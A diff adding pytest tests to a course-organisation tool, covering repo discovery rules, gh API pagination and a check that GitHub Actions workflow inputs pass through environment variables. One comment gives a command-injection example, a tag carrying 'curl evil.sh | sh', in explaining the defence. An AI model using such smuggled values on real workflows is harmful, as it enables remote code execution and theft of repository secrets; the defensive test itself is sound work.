@@ -198,6 +198,97 @@ def test_cap_sections_logs_and_truncates_past_the_limit(capsys):
     assert "readings" in err and "org/repo" in err
 
 
+INFRA_AND_CONTENT = [
+    {"name": ".github", "topics": []},
+    {"name": "welcome", "topics": []},
+    {"name": "classroom-config", "topics": []},
+    {"name": "my-course-f2026.github.io", "topics": []},  # the generated site repo
+    {"name": "grades-alice", "topics": ["gradebook"]},  # private student gradebook
+    {"name": "assignment-1-f2026-alice", "topics": ["submission"]},
+    {"name": "assignment-1-f2026-template", "topics": ["assignment-template"]},
+    {"name": "course-materials-f2026", "topics": []},
+    {"name": "labs", "topics": ["teaching"]},
+]
+
+
+def test_is_infra_repo_excludes_by_name_and_by_topic():
+    infra, content = INFRA_AND_CONTENT[:7], INFRA_AND_CONTENT[7:]
+    assert all(seed._is_infra_repo(r) for r in infra)
+    assert not any(seed._is_infra_repo(r) for r in content)
+    assert not seed._is_infra_repo({"name": "notes"})  # topics key absent -> content
+
+
+def test_both_discover_functions_apply_the_same_infra_exclusions(monkeypatch):
+    # One shared predicate: the public <org>.github.io site repo must never be treated
+    # as a content repo (those HOST the faculty workflows and get DSL_BOT_TOKEN set as a
+    # repo secret), and gradebooks/submissions must never appear as release targets.
+    monkeypatch.setattr(seed, "list_org_repos", lambda org: INFRA_AND_CONTENT)
+    expected = ["course-materials-f2026", "labs"]
+    assert seed.discover_cohort_repos(["Cohort-f2026"]) == expected
+    assert seed.discover_content_repos("My-Course-E1234") == expected
+
+
+def test_discover_content_repos_also_excludes_assignment_templates_by_name(monkeypatch):
+    # Course-org assignment templates carry no `assignment-template` topic (that one is
+    # set on the frozen cohort-side copy), so the name prefix is the content-side rule.
+    monkeypatch.setattr(
+        seed,
+        "list_org_repos",
+        lambda org: [
+            {"name": "assignment-1-f2026", "topics": ["assignment"]},
+            {"name": "course-materials-f2026", "topics": []},
+        ],
+    )
+    assert seed.discover_content_repos("My-Course-E1234") == ["course-materials-f2026"]
+
+
+def test_list_org_repos_paginates_instead_of_capping(monkeypatch):
+    # A cohort org holds a repo per student per assignment plus a gradebook each, so any
+    # fixed --limit silently truncates discovery. --paginate walks every page, and each
+    # page's --jq output is NDJSON (not one concatenated array).
+    calls = []
+    pages = (
+        '{"name":"a","topics":[],"isTemplate":false}\n'
+        '{"name":"b","topics":[],"isTemplate":true}\n'
+    )
+    monkeypatch.setattr(seed, "gh", lambda *args: (calls.append(args), (0, pages))[1])
+    assert [r["name"] for r in seed.list_org_repos("Org")] == ["a", "b"]
+    assert "--paginate" in calls[0] and "--limit" not in calls[0]
+    assert "orgs/Org/repos?per_page=100" in calls[0]
+
+
+def test_list_org_repos_reports_a_failed_listing_as_empty(monkeypatch, capsys):
+    monkeypatch.setattr(seed, "gh", lambda *args: (1, "gh: HTTP 502"))
+    assert seed.list_org_repos("Org") == []
+    assert "Org" in capsys.readouterr().err
+
+
+def test_scaffold_buttons_route_inputs_through_env_not_the_shell():
+    # GitHub substitutes ${{ inputs.x }} BEFORE the shell parses the run block, so a tag
+    # like `x; curl evil.sh | sh` would execute in a runner holding DSL_BOT_TOKEN. Every
+    # user-supplied input must reach the script as an env var instead.
+    materials, assignment = seed.render_new_materials(), seed.render_new_assignment()
+    for rendered in (materials, assignment):
+        step = workflow_jobs(rendered)["scaffold"]["steps"][-1]
+        assert "${{" not in step["run"]
+        assert step["env"]["TAG"] == "${{ inputs.tag }}"
+    assert '--tag "$TAG"' in materials
+    assert '--number "$NUMBER"' in assignment
+
+
+def test_bootstrap_org_workflow_routes_inputs_through_env_not_the_shell():
+    from pathlib import Path
+
+    wf = (
+        Path(__file__).resolve().parents[1] / ".github" / "workflows" / "bootstrap-org.yml"
+    ).read_text()
+    step = yaml.safe_load(wf)["jobs"]["bootstrap"]["steps"][-1]
+    assert "${{" not in step["run"]
+    assert step["env"]["ORG"] == "${{ inputs.org }}"
+    assert step["env"]["ORG_NAME"] == "${{ inputs.org_name }}"
+    assert step["env"]["COURSE_CODE"] == "${{ inputs.course_code }}"
+
+
 def test_discover_sections_union_combines_across_content_repos(monkeypatch):
     monkeypatch.setattr(
         seed,
